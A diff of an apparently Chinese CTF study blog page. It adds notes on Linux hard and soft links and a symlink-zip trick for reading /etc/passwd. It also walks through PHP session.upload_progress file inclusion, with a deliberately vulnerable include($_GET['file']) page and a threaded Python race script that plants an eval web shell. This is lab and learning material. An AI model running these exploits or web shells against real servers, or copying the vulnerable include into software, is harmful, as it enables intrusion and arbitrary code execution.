@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.7k</span>
+            <span class="post-count">3.4k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">9 min</span>
+            <span class="post-count">16 min</span>
         </span>
     </span>
 </div>
@@ -196,8 +196,7 @@
 <ol start="2">
 <li>is_numeric()函数用1234567a绕过，1234567a会被当做字符串，转换整型时候把a去掉</li>
 </ol>
-<p>##[MRCTF2020]套娃1</p>
-<ul>
+<h2 id="MRCTF2020-套娃1"><a href="#MRCTF2020-套娃1" class="headerlink" title="[MRCTF2020]套娃1"></a>[MRCTF2020]套娃1</h2><ul>
 <li>2020.7.21</li>
 </ul>
 <p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721161850938.png" alt="image-20210721161850938"></p>
@@ -235,6 +234,102 @@
 <p>exp</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.25.24.45:30194&#x2F;show_code.php?key1&#x3D;56.1%20&amp;key2&#x3D;10-2&amp;rq&#x3D;1&amp;fp&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;np&#x3D;1&amp;nq&#x3D;c47907abd2a80492ca9388b05c0e382518ff3960&amp;key3&#x3D;a:2:&#123;s:8:%22username%22;b:1;s:8:%22password%22;b:1;&#125;</span><br></pre></td></tr></table></figure>
 
+<h2 id="linux软硬链接"><a href="#linux软硬链接" class="headerlink" title="linux软硬链接"></a>linux软硬链接</h2><ul>
+<li>2021.9.24</li>
+</ul>
+<h4 id="索引节点-inode"><a href="#索引节点-inode" class="headerlink" title="索引节点(inode)"></a>索引节点(inode)</h4><p>Linux系统中，内核为每一个新创建的文件分配一个Inode(索引结点)，每个文件都有一个惟一的inode号，文件属性保存在索引结点里，在访问文件时，索引结点被复制到内存，从而实现文件的快速访问。系统是通过索引节点(而不是文件名)来定位每一个文件。</p>
+<h4 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h4><p>硬链接说白了是一个指针，指向文件索引节点，系统并不为它重新分配inode。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -li</span><br><span class="line"></span><br><span class="line"># ln命令来建立硬链接</span><br><span class="line">ln [options] existingfile newfile</span><br><span class="line"></span><br><span class="line">[options]:-f无论&quot;newfile&quot;存在与否，都创建链接。-n 如果&quot;newfile&quot;已存在，就不创建链接</span><br></pre></td></tr></table></figure>
+
+<p>特点：</p>
+<ol>
+<li>注意在创建硬链接前，显示的链接数目为1，创建链接后,链接数目都变为2，具有同样的索引节点号和文件属性。</li>
+<li>文件大小一样，可以跨目录，但是只适用于自己的本机的文件系统上。</li>
+</ol>
+<p>缺点：</p>
+<ol>
+<li>不可以在<code>不同文件系统</code>的文件间建立链接。</li>
+</ol>
+<h4 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h4><p>软链接又叫符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，可以链接不同文件系统的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ln -s 命令来建立软链接。</span><br><span class="line">ln -s existingfile newfile</span><br></pre></td></tr></table></figure>
+
+<p>特点：</p>
+<ol>
+<li>软链接原文件/链接文件拥有不同的inode号，</li>
+<li>可以适应其他系统</li>
+<li>文件大小是不一样的</li>
+</ol>
+<hr>
+<h4 id="软链接导致任意文件读取"><a href="#软链接导致任意文件读取" class="headerlink" title="软链接导致任意文件读取"></a>软链接导致任意文件读取</h4><p>前提条件：网站后台会解压读取该软链接指向读取目标文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;passwd passwd</span><br><span class="line"></span><br><span class="line">zip -y passwd.zip passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将pass.zip上传导目标服务器</p>
+<p>例题babypython[国赛总决赛复现</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180346637.png" alt="image-20210924180346637"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180358924.png" alt="image-20210924180358924"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZXT2804567059/article/details/120031287">例题</a></p>
+<p><a target="_blank" rel="noopener" href="http://t.zoukankan.com/Silkage-p-13218598.html">参考</a></p>
+<hr>
+<h2 id="upload-session"><a href="#upload-session" class="headerlink" title="upload-session"></a>upload-session</h2><ul>
+<li>2021.9.24</li>
+</ul>
+<p>php5.4后中添加了session.upload_progress这个功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#php.ini</span><br><span class="line"></span><br><span class="line">1.session.upload_progress.enabled &#x3D; On   #on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line"></span><br><span class="line">2.session.upload_progress.cleanup &#x3D; On   #在读取完POST的数据后,php就会删除session文件中关于上传进度的信息，需要条件竞争绕过。</span><br><span class="line"></span><br><span class="line">3.session.upload_progress.prefix &#x3D; “upload_progress_” #可以设置上传文件内容的前缀</span><br><span class="line"></span><br><span class="line">4.session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS” #name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>当一个上传在处理中，同时POST一个与INI中设置的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。  当PHP检测到这种POST请求时，它会在<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是  <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a>  与  <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。  通常这些键值可以通过读取INI设置来获得，</p>
+<p><strong>session.use_strict_mode</strong>默认值为off，此时用户是可以自己定义Session ID的。</p>
+<p>图中PHPSESSID=test，本地文件缓存sess_test文件</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924172910845.png" alt="image-20210924172910845"></p>
+<h4 id="session存放地方"><a href="#session存放地方" class="headerlink" title="session存放地方"></a>session存放地方</h4><p>当开启session时，服务器都会在一个临时目录下创建一个session文件来保存会话信息，文件名格式为 sess_PHPSESSID 。</p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>upload.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	highlight_file(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="session内容分析"><a href="#session内容分析" class="headerlink" title="session内容分析"></a>session内容分析</h4><p>PHPSESSID=test，可以生成sess_test文件，<code>111&lt;?php system(&quot;dir&quot;);?&gt;</code>即我们传入的</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924114742991.png" alt="image-20210924114742991"></p>
+<p>存入sess_test的内容</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924135912833.png" alt="image-20210924135912833"></p>
+<p>内容有两部分，以竖线<code>|</code>区分</p>
+<ol>
+<li>session.upload_progress.prefix+PHP_SESSION_UPLOAD_PROGRESS</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_111&lt;?php system(&quot;dir&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li>序列化后的文件传输过程的信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:10:&quot;start_time&quot;;i:1632463087;s:14:&quot;content_length&quot;;i:366;s:15:&quot;bytes_processed&quot;;i:366;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:8:&quot;file.txt&quot;;s:8:&quot;tmp_name&quot;;s:22:&quot;C:\Windows\php8C87.tmp&quot;;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:1;s:10:&quot;start_time&quot;;i:1632463087;s:15:&quot;bytes_processed&quot;;i:0;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化后，可以清楚看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">  [&quot;start_time&quot;]&#x3D;&gt;</span><br><span class="line">  int(1632463087)</span><br><span class="line">  [&quot;content_length&quot;]&#x3D;&gt;</span><br><span class="line">  int(366)</span><br><span class="line">  [&quot;bytes_processed&quot;]&#x3D;&gt;</span><br><span class="line">  int(366)</span><br><span class="line">  [&quot;done&quot;]&#x3D;&gt;</span><br><span class="line">  bool(true)</span><br><span class="line">  [&quot;files&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [0]&#x3D;&gt;</span><br><span class="line">    array(7) &#123;</span><br><span class="line">      [&quot;field_name&quot;]&#x3D;&gt;</span><br><span class="line">      string(4) &quot;file&quot;</span><br><span class="line">      [&quot;name&quot;]&#x3D;&gt;</span><br><span class="line">      string(8) &quot;file.txt&quot;</span><br><span class="line">      [&quot;tmp_name&quot;]&#x3D;&gt;</span><br><span class="line">      string(22) &quot;C:\Windows\php8C87.tmp&quot;</span><br><span class="line">      [&quot;error&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [&quot;done&quot;]&#x3D;&gt;</span><br><span class="line">      bool(true)</span><br><span class="line">      [&quot;start_time&quot;]&#x3D;&gt;</span><br><span class="line">      int(1632463087)</span><br><span class="line">      [&quot;bytes_processed&quot;]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>利用session.upload_progress上传一个临时文件，</p>
+<p>该文件里面有我们上传的恶意代码，然后包含它，</p>
+<p>从而执行里面的代码。因为该文件内容清空很快，所以需要不停的上传和包含，在清空之前包含该文件。</p>
+<p>竞争条件利用，上传文件要尽量大一些，增加上传时间</p>
+<p><a target="_blank" rel="noopener" href="https://www.sohu.com/a/314551190_354899">参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/15266741.html">参考2</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/15266741.html">整体思路</a></p>
+<p>python的竞争方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @Created by PyCharm_python-study_9.24session.py</span></span><br><span class="line"><span class="comment"># @Author: shmily-ing</span></span><br><span class="line"><span class="comment"># @Data: 2021/9/24 12:50</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:10086/upload.php&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    filebytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(<span class="string">&quot;http://127.0.0.1:10086/upload.php&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="comment">#&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;111&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;111222&lt;?php eval($_POST[1]);?&gt;&#x27;</span> </span><br><span class="line">                &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class="line">                &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;Lxxx.jpg&#x27;</span>, filebytes)</span><br><span class="line">                &#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url+<span class="string">&quot;?file=D:\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_&quot;</span>+sessid,</span><br><span class="line">                           data=&#123;</span><br><span class="line">                               <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;D:/phpstudy_pro/WWW/upload-session/1.php&#x27; , &#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>     <span class="comment">#包含一句话去写文件</span></span><br><span class="line">                           &#125;,</span><br><span class="line">                           cookies=&#123;</span><br><span class="line">                               <span class="string">&quot;PHPSESSID&quot;</span>:sessid</span><br><span class="line">                           &#125;</span><br><span class="line">                           )</span><br><span class="line">        res2 = session.get(<span class="string">&quot;http://127.0.0.1:10086/1.php&quot;</span>)</span><br><span class="line">        <span class="comment">#res2=requests.get(&quot;http://127.0.0.1:10086/upload.php/?file=D:\\phpstudy_pro\\Extensions\\tmp\\tmp\\sess_test&quot;,cookies=&#123;&quot;PHPSESSID&quot;:sessid&#125;)</span></span><br><span class="line">        <span class="keyword">if</span> res2.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;写入成功&quot;</span>)</span><br><span class="line">            <span class="comment">#print(res2.text)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    evnet = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()  <span class="comment">#Python的threading模块，开5个线程进行条件竞争</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<p>写入成功即可停止，在对应文件目录中可以看到写入的文件</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924174942242.png" alt="image-20210924174942242"></p>
+<p>或者用burp  开启start attack，一起跑两个请求</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180211084.png" alt="image-20210924180211084"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180807362.png" alt="image-20210924180807362"></p>
+<p>可以看到结果</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210924180839093.png" alt="image-20210924180839093"></p>
  
       <!-- reward -->
       
